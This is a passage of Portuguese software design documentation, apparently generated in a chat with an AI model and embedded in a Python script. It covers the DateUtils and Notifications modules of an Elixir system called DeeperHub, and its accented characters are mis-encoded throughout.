O m√≥dulo `DeeperHub.Shared.Utils.DateUtils` fornece um conjunto de fun√ß√µes utilit√°rias para **manipula√ß√£o, c√°lculo e formata√ß√£o de datas e horas** no sistema DeeperHub. Ele visa simplificar opera√ß√µes comuns relacionadas ao tempo, como adicionar ou subtrair intervalos, calcular diferen√ßas entre datas, formatar datas para exibi√ß√£o e verificar se uma data est√° dentro de um determinado per√≠odo.

Este m√≥dulo utiliza as estruturas de data e hora nativas do Elixir (`Date`, `Time`, `NaiveDateTime`, `DateTime`) e bibliotecas de calend√°rio para fornecer funcionalidades robustas e conscientes de fuso hor√°rio quando necess√°rio. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Manipula√ß√£o de Datas/Horas:**
    *   Adicionar ou subtrair unidades de tempo (segundos, minutos, horas, dias, semanas, meses, anos) a uma data/hora (`add/3`).
    *   Obter o in√≠cio ou fim de um per√≠odo (dia, semana, m√™s, ano) para uma data/hora espec√≠fica.
*   **C√°lculo de Diferen√ßas:**
    *   Calcular a diferen√ßa entre duas datas/horas em uma unidade espec√≠fica (`diff/3`).
*   **Formata√ß√£o de Datas/Horas:**
    *   Formatar `DateTime`, `NaiveDateTime`, ou `Date` em strings leg√≠veis usando formatos predefinidos (curto, m√©dio, longo) ou customizados (`format_datetime/3`).
    *   Formatar dura√ß√µes (em segundos ou outra unidade) em strings amig√°veis (ex: \"1h 10m\", \"2 dias e 3 horas\") (`format_duration/2`).
*   **Verifica√ß√£o de Intervalos:**
    *   Verificar se uma data/hora est√° entre duas outras datas/horas (`is_between/3`).
    *   Verificar se uma data/hora est√° no passado ou no futuro.
    *   Verificar se um per√≠odo de tempo se sobrep√µe a outro.
*   **Convers√µes e Utilit√°rios de Fuso Hor√°rio (Timezone):**
    *   Converter `NaiveDateTime` para `DateTime` em um fuso hor√°rio espec√≠fico (e vice-versa), se o sistema lidar com m√∫ltiplos fusos hor√°rios de forma expl√≠cita.
    *   Obter o fuso hor√°rio padr√£o da aplica√ß√£o.
*   **Gera√ß√£o de Timestamps:**
    *   Fornecer fun√ß√µes convenientes para obter o timestamp atual em UTC ou em formatos espec√≠ficos.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.DateUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade para datas e horas.
    *   Utiliza os m√≥dulos `Date`, `Time`, `NaiveDateTime`, `DateTime` do Elixir.
    *   Pode usar bibliotecas como `Calendar` ou `Timex` para funcionalidades mais avan√ßadas de manipula√ß√£o de calend√°rio e fuso hor√°rio se as fun√ß√µes nativas n√£o forem suficientes.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/date_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Consist√™ncia com Tipos Nativos:** Priorizar o uso e retorno dos tipos de data/hora nativos do Elixir (`Date`, `NaiveDateTime`, `DateTime`).
*   **Consci√™ncia de Fuso Hor√°rio:** Para opera√ß√µes que envolvem `DateTime`, ser expl√≠cito sobre fusos hor√°rios. Armazenar datas/horas no banco de dados preferencialmente em UTC e converter para o fuso hor√°rio do usu√°rio apenas para exibi√ß√£o.
*   **Clareza da API:** Nomes de fun√ß√µes e par√¢metros devem ser intuitivos.
*   **Imutabilidade:** Fun√ß√µes que modificam datas (como `add/3`) devem retornar uma nova estrutura de data/hora, n√£o modificar a original.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Calcular Data de Expira√ß√£o de um Token:**
    *   `token_creation_time = DateTime.utc_now()`
    *   `expiry_time = DateUtils.add(token_creation_time, 7, :day)`
*   **Exibir Data de Cria√ß√£o de um Post de Forma Amig√°vel:**
    *   `formatted_date = DateUtils.format_datetime(post.inserted_at, :medium, user_locale)`
*   **Verificar se um Evento Agendado J√° Come√ßou:**
    *   `now = DateTime.utc_now()`
    *   `has_started = DateTime.compare(now, event.start_time) != :lt` (ou usando `is_between/3` de forma mais abstrata).
*   **Calcular H√° Quanto Tempo um Coment√°rio foi Postado:**
    *   `time_ago_in_seconds = DateUtils.diff(comment.inserted_at, DateTime.utc_now(), :seconds)`
    *   `friendly_time_ago = DateUtils.format_duration(time_ago_in_seconds, :short)` (ex: \"5m atr√°s\", \"2h atr√°s\")

## üåä 5. Fluxos Importantes

N√£o aplic√°vel (m√≥dulo funcional).

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original e expandindo)*

### 6.1. `DeeperHub.Shared.Utils.DateUtils.add(datetime :: Date.t() | NaiveDateTime.t() | DateTime.t(), amount :: integer(), unit :: :second | :minute | :hour | :day | :week | :month | :year) :: Date.t() | NaiveDateTime.t() | DateTime.t()`

*   **Descri√ß√£o:** Adiciona uma quantidade de `unit` a `datetime`. Retorna o mesmo tipo que foi passado.
*   **Exemplo:** `DateUtils.add(DateTime.utc_now(), -3, :month)` (subtrai 3 meses).

### 6.2. `DeeperHub.Shared.Utils.DateUtils.diff(start_datetime, end_datetime, unit :: :second | :minute | :hour | :day | :week | :month | :year) :: float() | integer()`

*   **Descri√ß√£o:** Calcula a diferen√ßa entre `end_datetime` e `start_datetime` na `unit` especificada.
*   Pode retornar float para unidades como `:hour` ou `:day` se houver fra√ß√µes.
*   **Exemplo:** `DateUtils.diff(~N[2023-01-01 10:00:00], ~N[2023-01-01 11:30:00], :minute)` -> `90`.

### 6.3. `DeeperHub.Shared.Utils.DateUtils.format_datetime(datetime, format_type :: :short | :medium | :long | :full | String.t(), locale :: String.t() \\\\ \"en\") :: String.t()`

*   **Descri√ß√£o:** Formata `datetime` para uma string. `locale` pode ser \"pt-BR\", \"en-US\", etc. Se `format_type` for uma string, ela √© usada como um formato customizado (ex: `\"{YYYY}-{0M}-{0D} {h24}:{0m}:{0s}\"`).
*   **Exemplo:** `DateUtils.format_datetime(DateTime.utc_now(), :long, \"pt-BR\")`.

### 6.4. `DeeperHub.Shared.Utils.DateUtils.format_duration(duration_seconds :: non_neg_integer(), format_type :: :short | :medium | :long | :human) :: String.t()`

*   **Descri√ß√£o:** Formata uma dura√ß√£o em segundos para uma string leg√≠vel.
    *   `:short`: \"1d 2h 3m 4s\"
    *   `:medium`: \"1 day, 2 hours, 3 minutes, 4 seconds\"
    *   `:long`: Similar a medium, mas pode ser mais verboso.
    *   `:human`: \"h√° 5 minutos\", \"em 2 horas\" (requer um ponto de refer√™ncia, ou assume \"atr√°s\").
*   **Exemplo:** `DateUtils.format_duration(90061, :medium)` -> `\"1 day, 1 hour, 1 minute, 1 second\"` (aproximado).

### 6.5. `DeeperHub.Shared.Utils.DateUtils.is_between?(datetime_to_check, start_datetime, end_datetime, inclusive_ends :: boolean() \\\\ true) :: boolean()`

*   **Descri√ß√£o:** Verifica se `datetime_to_check` est√° entre `start_datetime` e `end_datetime`.
*   **`inclusive_ends`:** Se `true`, os limites s√£o inclusivos (`<=`, `>=`). Se `false`, exclusivos (`<`, `>`).

### 6.6. `DeeperHub.Shared.Utils.DateUtils.start_of(datetime, unit :: :day | :week | :month | :year) :: Date.t() | NaiveDateTime.t() | DateTime.t()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Retorna o in√≠cio da unidade de tempo para a data/hora fornecida.
*   **Exemplo:** `DateUtils.start_of(~N[2023-05-12 15:30:00], :month)` -> `~N[2023-05-01 00:00:00]`.

### 6.7. `DeeperHub.Shared.Utils.DateUtils.end_of(datetime, unit :: :day | :week | :month | :year) :: Date.t() | NaiveDateTime.t() | DateTime.t()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Retorna o fim (√∫ltimo microssegundo) da unidade de tempo para a data/hora fornecida.
*   **Exemplo:** `DateUtils.end_of(~N[2023-05-12 15:30:00], :day)` -> `~N[2023-05-12 23:59:59.999999]`.

### 6.8. `DeeperHub.Shared.Utils.DateUtils.to_iso8601(datetime :: DateTime.t()) :: String.t()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Formata um `DateTime` para o padr√£o ISO8601 (ex: `\"2023-05-12T10:30:00.123Z\"`).

### 6.9. `DeeperHub.Shared.Utils.DateUtils.from_iso8601(iso_string :: String.t()) :: {:ok, DateTime.t()} | {:error, term()}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Parseia uma string ISO8601 para um `DateTime`.

### 6.10. `DeeperHub.Shared.Utils.DateUtils.utc_now_trimmed_to_second() :: DateTime.t()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Retorna `DateTime.utc_now()` com os microssegundos zerados, √∫til para compara√ß√µes ou armazenamento.

## ‚öôÔ∏è 7. Configura√ß√£o

Este m√≥dulo geralmente n√£o tem configura√ß√µes complexas, mas poderia obter do `Core.ConfigManager`:
*   `[:shared, :utils, :date, :default_locale_for_formatting]` (String): Locale padr√£o para `format_datetime/3`. (Padr√£o: `\"en\"`)
*   `[:shared, :utils, :date, :default_timezone]` (String): Fuso hor√°rio padr√£o da aplica√ß√£o (ex: `\"Etc/UTC\"`, `\"America/Sao_Paulo\"`). (Padr√£o: `\"Etc/UTC\"`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager` (opcional, para configura√ß√µes padr√£o).

### 8.2. Bibliotecas Externas

*   `Calendar` (do Elixir): Usado internamente por `Date`, `DateTime`, etc.
*   `Timex` (opcional): Uma biblioteca popular para manipula√ß√£o de datas e horas mais avan√ßada, se as funcionalidades nativas n√£o forem suficientes. No entanto, para os utilit√°rios listados, a biblioteca padr√£o Elixir j√° oferece bastante.

## ü§ù 9. Como Usar / Integra√ß√£o

Simplesmente chame as fun√ß√µes do m√≥dulo onde a manipula√ß√£o de data/hora for necess√°ria.
```elixir
alias DeeperHub.Shared.Utils.DateUtils

def token_expired?(token_created_at, ttl_days) do
  expiry_date = DateUtils.add(token_created_at, ttl_days, :day)
  DateTime.compare(DateTime.utc_now(), expiry_date) == :gt
end

def display_event_duration(start_time, end_time) do
  duration_seconds = DateUtils.diff(start_time, end_time, :second)
  DateUtils.format_duration(duration_seconds, :medium)
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios para cada fun√ß√£o com uma variedade de entradas, incluindo:
    *   Diferentes tipos de data/hora (`Date`, `NaiveDateTime`, `DateTime`).
    *   Casos de borda (ex: adicionar a um fim de m√™s, anos bissextos).
    *   Diferentes unidades e formatos.
    *   Valores `nil` ou inv√°lidos (se a fun√ß√£o os aceitar e tiver comportamento definido).
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/date_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

Geralmente n√£o aplic√°vel para um m√≥dulo de utilit√°rios puros, a menos que uma fun√ß√£o espec√≠fica seja identificada como cr√≠tica para performance e precise de instrumenta√ß√£o.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes devem levantar `ArgumentError` ou `FunctionClauseError` para tipos de entrada inv√°lidos.
*   Fun√ß√µes de parsing (como `from_iso8601`) devem retornar `{:ok, value} | {:error, reason}`.
*   A documenta√ß√£o de cada fun√ß√£o deve especificar seu comportamento de erro.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Timezone:** A principal considera√ß√£o √© o manuseio correto de fusos hor√°rios. Confus√µes de fuso hor√°rio podem levar a bugs l√≥gicos e, em alguns casos, a vulnerabilidades (ex: expira√ß√£o incorreta de tokens ou sess√µes). Sempre que poss√≠vel, trabalhe com `DateTime` em UTC internamente e converta para o fuso hor√°rio do usu√°rio apenas na camada de apresenta√ß√£o.
*   **Entrada do Usu√°rio:** Se datas/horas vierem de entrada do usu√°rio, elas devem ser parseadas e validadas rigorosamente antes de serem usadas em c√°lculos.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novas fun√ß√µes, garanta que elas lidem corretamente com os diferentes tipos de data/hora do Elixir e sejam conscientes de fusos hor√°rios se usarem `DateTime`.
*   Adicione testes unit√°rios completos para todas as novas funcionalidades.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais fun√ß√µes de conveni√™ncia (ex: `is_weekend?`, `days_in_month`, `next_business_day`).
*   [ ] Melhorar a fun√ß√£o `format_duration` para suportar internacionaliza√ß√£o (ex: \"1 dia\" vs \"1 day\").
*   [ ] Considerar a integra√ß√£o com `Timex` para funcionalidades de calend√°rio mais complexas se necess√°rio (ex: feriados, recorr√™ncias complexas).
*   [ ] Fun√ß√µes para calcular \"tempo relativo\" (ex: \"h√° 5 minutos\", \"amanh√£\", \"na pr√≥xima semana\") de forma mais robusta e internacionalizada.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Os utilit√°rios de data s√£o sempre √∫teis!

Pr√≥ximo? `MapUtils` ou `ListUtils` para continuar nos utilit√°rios, ou podemos voltar para um m√≥dulo Core mais complexo como `DeeperHub.Core.BackgroundTaskManager` (que j√° come√ßamos) ou `DeeperHub.Notifications`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° documentamos o `DeeperHub.Core.BackgroundTaskManager`.

Vamos ent√£o para outro m√≥dulo Core essencial: `DeeperHub.Notifications`. Este m√≥dulo √© respons√°vel por toda a comunica√ß√£o proativa do sistema com os usu√°rios.

---

# M√≥dulo: `DeeperHub.Notifications` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Notifications`

O m√≥dulo `DeeperHub.Notifications` √© o sistema centralizado para **gerenciar e entregar notifica√ß√µes** aos usu√°rios do DeeperHub atrav√©s de m√∫ltiplos canais. Ele permite que diferentes partes da aplica√ß√£o enviem mensagens importantes, alertas, lembretes ou atualiza√ß√µes para os usu√°rios de forma consistente e configur√°vel.

As notifica√ß√µes podem ser enviadas por canais como email, SMS (opcional), notifica√ß√µes push para aplicativos m√≥veis, e notifica√ß√µes in-app (dentro da pr√≥pria interface web/mobile do DeeperHub). O sistema tamb√©m gerencia as prefer√™ncias de notifica√ß√£o dos usu√°rios, permitindo que eles escolham quais tipos de notifica√ß√µes desejam receber e por quais canais. üòä

*(Nota: A documenta√ß√£o original tem `DeeperHub.Core.NotificationsFacade`, `DeeperHub.Notifications` (m√≥dulo principal), `Services.DefaultNotificationService`, `Channels`, `Cache`, `Templates`, `Workers`, etc. Esta documenta√ß√£o consolida a fachada em `DeeperHub.Notifications` e organiza os componentes internos.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Envio de Notifica√ß√µes Multicanal:**
    *   Enviar notifica√ß√µes atrav√©s de canais configurados: Email, In-App, Push (e opcionalmente SMS, Slack, etc.).
    *   Abstrair a complexidade de cada canal de entrega.
*   **Gerenciamento de Conte√∫do e Templates (`Templates.TemplateManager`):**
    *   Utilizar templates para formatar o conte√∫do das notifica√ß√µes.
    *   Suporte √† internacionaliza√ß√£o (i18n) de templates (`Templates.I18n.Translator`).
*   **Gerenciamento de Prefer√™ncias do Usu√°rio (`Services.PreferencesService`):**
    *   Permitir que usu√°rios configurem quais tipos de notifica√ß√µes desejam receber em cada canal.
    *   Respeitar as prefer√™ncias do usu√°rio ao decidir se e como enviar uma notifica√ß√£o.
*   **Agendamento de Notifica√ß√µes (`Core.Notifications.Scheduler`):**
    *   Permitir o agendamento de notifica√ß√µes para serem enviadas em um momento futuro.
*   **Rastreamento e Hist√≥rico de Notifica√ß√µes (`Services.HistoryService`):**
    *   Manter um hist√≥rico das notifica√ß√µes enviadas aos usu√°rios.
    *   Rastrear o status de entrega (enviada, entregue, falha, lida - se poss√≠vel).
    *   Permitir que usu√°rios visualizem seu hist√≥rico de notifica√ß√µes.
*   **Notifica√ß√µes In-App (`Channels.InAppChannel`):**
    *   Armazenar e exibir notifica√ß√µes dentro da interface da aplica√ß√£o.
    *   Gerenciar o status de \"lida/n√£o lida\" para notifica√ß√µes in-app.
*   **Processamento Ass√≠ncrono (`Workers`):**
    *   Enviar notifica√ß√µes (especialmente email e push) de forma ass√≠ncrona para n√£o bloquear o fluxo principal da aplica√ß√£o.
*   **Observabilidade e M√©tricas (`Telemetry`, `Metrics.MetricsReporter`):**
    *   Registrar m√©tricas sobre o volume de notifica√ß√µes enviadas, taxas de entrega, taxas de abertura (se rastre√°vel), erros.
    *   Logar atividades importantes e falhas.
*   **Limpeza de Dados Antigos (`Workers.RetentionWorker`):**
    *   Remover registros de notifica√ß√µes antigas conforme pol√≠ticas de reten√ß√£o.
*   **Integra√ß√£o com Eventos do Sistema (`Integrations.EventIntegration`):**
    *   Escutar eventos do `Core.EventBus` (ex: `user.created`, `password.reset_requested`) para disparar notifica√ß√µes relevantes automaticamente.
    *   Publicar eventos sobre o ciclo de vida das notifica√ß√µes (ex: `notification.sent`, `notification.read`).
*   **Notifica√ß√µes de Seguran√ßa (`Services.SecurityNotificationService`, `TokenNotifications`):**
    *   Enviar notifica√ß√µes cr√≠ticas relacionadas √† seguran√ßa da conta do usu√°rio.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Notifications` (Fachada P√∫blica):**
    *   Ponto de entrada principal para enviar notifica√ß√µes e gerenciar prefer√™ncias.
    *   Delega para `NotificationService` (ou `DefaultNotificationService`).
2.  **`DeeperHub.Notifications.Services.DefaultNotificationService` (GenServer ou Servi√ßo Coordenador):**
    *   **Responsabilidade:** Orquestra o processo de envio de notifica√ß√µes.
    *   **Intera√ß√µes:**
        *   `PreferencesService`: Para verificar as prefer√™ncias do usu√°rio.
        *   `TemplateManager`: Para renderizar o conte√∫do da notifica√ß√£o.
        *   `Channel Adapters/Handlers` (ex: `EmailChannel`, `PushChannel`, `InAppChannel`): Para despachar a notifica√ß√£o para o canal apropriado.
        *   `Core.BackgroundTaskManager`: Para enfileirar o envio de notifica√ß√µes ass√≠ncronas.
        *   `HistoryService`: Para registrar a notifica√ß√£o enviada.
        *   `Core.ConfigManager`: Para configura√ß√µes do sistema de notifica√ß√µes.
3.  **`DeeperHub.Notifications.Services.PreferencesService`:**
    *   Gerencia as prefer√™ncias de notifica√ß√£o dos usu√°rios (CRUD e consulta).
    *   Utiliza `DeeperHub.Notifications.Cache.PreferencesCache`.
4.  **`DeeperHub.Notifications.Services.HistoryService`:**
    *   Gerencia o hist√≥rico de notifica√ß√µes (CRUD e consulta).
5.  **`DeeperHub.Notifications.Templates.TemplateManager`:**
    *   Respons√°vel por carregar, renderizar e cachear templates de notifica√ß√£o.
    *   Usa `Templates.I18n.Translator` para internacionaliza√ß√£o.
6.  **`DeeperHub.Notifications.Channels.<ChannelName>Channel` (Behaviours e Implementa√ß√µes):**
    *   Cada canal (Email, Push, InApp, SMS) tem seu pr√≥prio m√≥dulo que implementa um `NotificationChannelBehaviour`.
    *   Ex: `EmailChannel` usa `DeeperHub.Mailer` para enviar emails.
    *   Ex: `PushChannel` interage com servi√ßos como FCM/APNS.
7.  **`DeeperHub.Core.Notifications.Scheduler` (GenServer):**
    *   Gerencia o agendamento e disparo de notifica√ß√µes futuras.
8.  **Workers (`EmailWorker`, `PushWorker`, `InAppWorker`, `RetentionWorker`, `MetricsWorker`):**
    *   Processam o envio real de notifica√ß√µes, coletam m√©tricas, limpam dados antigos.
9.  **Schemas Ecto:**
    *   `DeeperHub.Notifications.Schema.Notification`: Entidade principal da notifica√ß√£o.
    *   `DeeperHub.Notifications.Schema.NotificationPreference`: Prefer√™ncias do usu√°rio.
    *   `DeeperHub.Notifications.Schema.ScheduledNotification`: Notifica√ß√µes agendadas.
    *   `DeeperHub.Notifications.Schema.NotificationDelivery`: (Opcional) Para rastrear o status de entrega por canal.
10. **Cache (`PreferencesCache`, `TemplateCache`):**
    *   Para otimizar o acesso a prefer√™ncias e templates renderizados.
11. **Integra√ß√µes (`AuditIntegration`, `EventIntegration`):**
    *   Para logar no sistema de auditoria e interagir com o EventBus.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/notifications/
‚îú‚îÄ‚îÄ notifications.ex                  # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ default_notification_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ preferences_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ history_service.ex
‚îÇ   ‚îî‚îÄ‚îÄ security_notification_service.ex # (Ou TokenNotifications.ex)
‚îÇ
‚îú‚îÄ‚îÄ channels/
‚îÇ   ‚îú‚îÄ‚îÄ notification_channel_behaviour.ex
‚îÇ   ‚îú‚îÄ‚îÄ email_channel.ex
‚îÇ   ‚îú‚îÄ‚îÄ in_app_channel.ex
‚îÇ   ‚îî‚îÄ‚îÄ push_channel.ex
‚îÇ   #‚îú‚îÄ‚îÄ sms_channel.ex (Opcional)
‚îÇ
‚îú‚îÄ‚îÄ templates/
‚îÇ   ‚îú‚îÄ‚îÄ template_manager.ex
‚îÇ   ‚îú‚îÄ‚îÄ i18n/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ translator.ex
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ pt_br.ex # Exemplo de arquivo de tradu√ß√£o
‚îÇ   ‚îî‚îÄ‚îÄ email/ # Subdiret√≥rio para templates de email
‚îÇ       ‚îî‚îÄ‚îÄ welcome_email.html.eex
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/ singular)
‚îÇ   ‚îú‚îÄ‚îÄ notification.ex
‚îÇ   ‚îú‚îÄ‚îÄ notification_preference.ex
‚îÇ   ‚îú‚îÄ‚îÄ scheduled_notification.ex
‚îÇ   ‚îî‚îÄ‚îÄ notification_delivery.ex      # Opcional
‚îÇ
‚îú‚îÄ‚îÄ workers/
‚îÇ   ‚îú‚îÄ‚îÄ email_worker.ex
‚îÇ   ‚îú‚îÄ‚îÄ push_worker.ex
‚îÇ   ‚îú‚îÄ‚îÄ in_app_worker.ex
‚îÇ   ‚îú‚îÄ‚îÄ retention_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ metrics_worker.ex             # Para coletar m√©tricas peri√≥dicas do sistema de notifica√ß√µes
‚îÇ
‚îú‚îÄ‚îÄ cache/
‚îÇ   ‚îú‚îÄ‚îÄ preferences_cache.ex
‚îÇ   ‚îî‚îÄ‚îÄ template_cache.ex
‚îÇ
‚îú‚îÄ‚îÄ integrations/
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex
‚îÇ   ‚îî‚îÄ‚îÄ event_integration.ex
‚îÇ
‚îú‚îÄ‚îÄ scheduler.ex                      # (Core.Notifications.Scheduler)
‚îú‚îÄ‚îÄ supervisor.ex                     # Supervisor principal do m√≥dulo Notifications
‚îú‚îÄ‚îÄ unified_supervisor.ex             # Supervisor que inicia o supervisor principal
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Desacoplamento de Canais:** A l√≥gica de envio para cada canal √© isolada em seu pr√≥prio m√≥dulo, facilitando a adi√ß√£o ou modifica√ß√£o de canais.
*   **Processamento Ass√≠ncrono:** O envio de notifica√ß√µes (especialmente email/push) √© feito em background para n√£o impactar a performance da requisi√ß√£o original.
*   **Prefer√™ncias do Usu√°rio em Primeiro Lugar:** O sistema deve sempre respeitar as prefer√™ncias do usu√°rio antes de enviar uma notifica√ß√£o.
*   **Templates e I18n:** Usar templates e internacionaliza√ß√£o torna as notifica√ß√µes flex√≠veis e personaliz√°veis.
*   **Rastreabilidade:** Manter um hist√≥rico e status de entrega √© importante para diagn√≥stico e para o usu√°rio.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Novo Usu√°rio se Registra:**
    *   `DeeperHub.Accounts` publica evento `user.created`.
    *   `Notifications.Integrations.EventIntegration` (ou um listener espec√≠fico) recebe o evento.
    *   Chama `Notifications.send_notification(user_id, :welcome_email, %{name: user.name}, opts)` (o tipo `:welcome_email` define o template e canais padr√£o).
    *   `DefaultNotificationService` verifica prefer√™ncias, renderiza o template e enfileira a tarefa de envio para `EmailWorker`.
*   **Alerta de Seguran√ßa: Login de Novo Dispositivo:**
    *   `DeeperHub.Security` detecta o novo dispositivo.
    *   Chama `Notifications.Services.SecurityNotificationService.notify_new_device(user_id, device_info, opts)`.
    *   Esta fun√ß√£o pode ter canais priorit√°rios (ex: email e push) e um template espec√≠fico.
*   **Lembrete de Tarefa Agendada:**
    *   Uma tarefa foi agendada para notificar o usu√°rio.
    *   `Core.Notifications.Scheduler` dispara a notifica√ß√£o no momento correto.
    *   Chama `Notifications.send_notification(...)`.
*   **Usu√°rio Atualiza Prefer√™ncias de Notifica√ß√£o:**
    *   Usu√°rio desmarca notifica√ß√µes por email para \"novidades\".
    *   UI chama `Notifications.update_notification_preferences(user_id, new_preferences)`.
    *   `PreferencesService` atualiza e invalida o cache.

## üåä 5. Fluxos Importantes

### Fluxo de Envio de Notifica√ß√£o (Exemplo: Email)

1.  **Chamador (ex: `AccountsService`):** Chama `DeeperHub.Notifications.send_notification(user_id, :user_registered, %{user_name: \"John\"}, opts)`.
2.  **`Notifications` (Fachada):** Delega para `DefaultNotificationService`.
3.  **`DefaultNotificationService`:**
    *   Chama `PreferencesService.get_user_preferences(user_id)` para ver se o usu√°rio quer receber notifica√ß√µes do tipo `:user_registered` e por quais canais.
    *   Se o canal email estiver habilitado para este tipo:
        *   Chama `TemplateManager.render_email_template(\"user_registered_email\", locale, %{user_name: \"John\", ...})` para obter o assunto e corpo do email.
        *   Chama `TemplateManager.get_email_subject(\"user_registered_email\", locale)`.
        *   Cria uma struct `Notification` com os detalhes.
        *   Persiste a `Notification` via `HistoryService` (ou diretamente via Repo).
        *   Enfileira uma tarefa para `DeeperHub.Notifications.Workers.EmailWorker` via `Core.BackgroundTaskManager` passando o `notification_id` ou todos os dados do email.
4.  **`EmailWorker` (Background Task):**
    *   Recebe a tarefa.
    *   Busca os detalhes da notifica√ß√£o (se apenas o ID foi passado).
    *   Chama `DeeperHub.Mailer.send_email(%{to: user.email, subject: ..., body: ...})`.
    *   Atualiza o status da `Notification` (e/ou `NotificationDelivery`) para `:sent` ou `:failed` via `HistoryService`.
    *   Publica evento `notification.sent` ou `notification.failed` via `Core.EventBus`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Notifications`)

*(Muitas j√° foram vistas na documenta√ß√£o original de `NotificationsFacade` e `Core.NotificationsFacade`. Consolidando e refinando.)*

### 6.1. `DeeperHub.Notifications.send_notification(user_id :: String.t(), notification_type :: atom(), content_data :: map(), opts :: keyword()) :: {:ok, Notification.t() | list(Notification.t())} | {:error, term()}`

*   **Descri√ß√£o:** Envia uma notifica√ß√£o para um usu√°rio. O `notification_type` √© usado para buscar o template, determinar os canais padr√£o e respeitar as prefer√™ncias do usu√°rio.
*   **`content_data`:** Mapa com vari√°veis para o template.
*   **`opts`:**
    *   `:channels` (list(atom)): For√ßa o envio por canais espec√≠ficos, ignorando algumas prefer√™ncias (usar com cautela). Ex: `[:email, :in_app]`.
    *   `:priority` (atom): `:low`, `:normal`, `:high`.
    *   `:metadata` (map): Metadados adicionais.
*   **Retorno:** Pode retornar a `Notification` criada ou uma lista se for para m√∫ltiplos canais/entregas.

### 6.2. `DeeperHub.Notifications.send_bulk_notification(user_ids :: list(String.t()), notification_type :: atom(), content_data :: map(), opts :: keyword()) :: {:ok, BulkNotificationJob.t()} | {:error, term()}`

*   **Descri√ß√£o:** Envia a mesma notifica√ß√£o para m√∫ltiplos usu√°rios. Geralmente enfileira um job de background.
*   **`BulkNotificationJob.t()`:** Uma struct com informa√ß√µes sobre o job em lote.

### 6.3. `DeeperHub.Notifications.schedule_notification(user_id :: String.t(), notification_type :: atom(), content_data :: map(), scheduled_at :: DateTime.t(), opts :: keyword()) :: {:ok, ScheduledNotification.t()} | {:error, term()}`

*   **Descri√ß√£o:** Agenda uma notifica√ß√£o para envio futuro.

### 6.4. `DeeperHub.Notifications.cancel_scheduled_notification(scheduled_notification_id :: String.t(), opts :: keyword()) :: :ok | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Cancela uma notifica√ß√£o agendada.

### 6.5. `DeeperHub.Notifications.get_user_notification_preferences(user_id :: String.t()) :: {:ok, NotificationPreference.t()} | {:error, term()}`

*   **Descri√ß√£o:** Obt√©m as prefer√™ncias de notifica√ß√£o de um usu√°rio.

### 6.6. `DeeperHub.Notifications.update_user_notification_preferences(user_id :: String.t(), preferences_map :: map()) :: {:ok, NotificationPreference.t()} | {:error, Ecto.Changeset.t()}`

*   **Descri√ß√£o:** Atualiza as prefer√™ncias de notifica√ß√£o de um usu√°rio.
*   **`preferences_map`:** Ex: `%{email: %{marketing_updates: false, security_alerts: true}, push: %{all_enabled: true}}`.

### 6.7. `DeeperHub.Notifications.get_unread_notifications(user_id :: String.t(), opts :: keyword()) :: {:ok, list(Notification.t()), Pagination.t()}`

*   **Descri√ß√£o:** Obt√©m notifica√ß√µes in-app n√£o lidas para um usu√°rio.
*   **`opts`:** `:channel` (se houver m√∫ltiplos tipos de in-app), `:limit`, `:page`.

### 6.8. `DeeperHub.Notifications.mark_notification_as_read(notification_id :: String.t(), user_id :: String.t()) :: :ok | {:error, :not_found | :unauthorized}`

*   **Descri√ß√£o:** Marca uma notifica√ß√£o espec√≠fica (geralmente in-app) como lida.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:notifications, :enabled]`** (Boolean): Habilita/desabilita o sistema de notifica√ß√µes.
*   **`[:notifications, :default_channels, <notification_type>]`** (List de Atoms): Canais padr√£o para um tipo de notifica√ß√£o se o usu√°rio n√£o tiver prefer√™ncias (ex: `%{user_registered: [:email, :in_app]}`).
